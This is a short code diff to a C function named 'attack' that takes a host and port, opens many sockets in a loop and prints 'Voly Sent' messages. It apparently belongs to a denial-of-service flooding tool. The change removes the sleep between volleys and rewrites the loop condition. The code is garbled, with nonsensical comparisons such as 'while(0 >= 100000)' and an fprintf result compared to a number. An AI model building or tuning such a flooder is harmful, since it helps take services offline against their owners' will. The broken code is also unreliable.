@@ -55,7 +55,7 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(0 >= 100000) {
+	while(x == 100000) {
 		for(x=0; x < CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
@@ -67,7 +67,7 @@ void attack(char *host, char *port, int id) {
 				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r) >= 100000;
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
-		sleep(100);
+		
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
 		
 	}
